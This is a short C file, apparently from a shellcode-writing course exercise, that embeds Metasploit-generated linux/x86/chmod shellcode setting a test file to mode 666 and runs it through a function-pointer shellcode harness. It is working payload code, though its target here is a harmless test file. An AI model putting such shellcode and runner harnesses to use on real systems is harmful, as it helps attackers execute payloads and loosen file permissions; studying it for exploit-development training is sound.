#include<stdio.h>
#include<string.h>

/*
 * linux/x86/chmod - 96 bytes
 * http://www.metasploit.com
 * VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
 * PrependSetreuid=false, PrependSetuid=false, 
 * PrependSetresgid=false, PrependSetregid=false, 
 * PrependSetgid=false, PrependChrootBreak=false, 
 * AppendExit=false, 
FILE=/home/remote * /Dropbox/Pentesting/SLAE_exercises/assignment5/testfile.txt, 
 * MODE=666
 */
unsigned char code[] = 
"\x99\x6a\x0f\x58\x52\xe8\x48\x00\x00\x00\x2f\x68\x6f\x6d\x65"
"\x2f\x72\x65\x6d\x6f\x74\x65\x2f\x44\x72\x6f\x70\x62\x6f\x78"
"\x2f\x50\x65\x6e\x74\x65\x73\x74\x69\x6e\x67\x2f\x53\x4c\x41"
"\x45\x5f\x65\x78\x65\x72\x63\x69\x73\x65\x73\x2f\x61\x73\x73"
"\x69\x67\x6e\x6d\x65\x6e\x74\x35\x2f\x74\x65\x73\x74\x66\x69"
"\x6c\x65\x2e\x74\x78\x74\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd"
"\x80\x6a\x01\x58\xcd\x80";


main()
{
    printf("Shellcode Length: %d\n", sizeof(code)-1);
    int (*ret)() = (int(*)())code;
    ret();
}
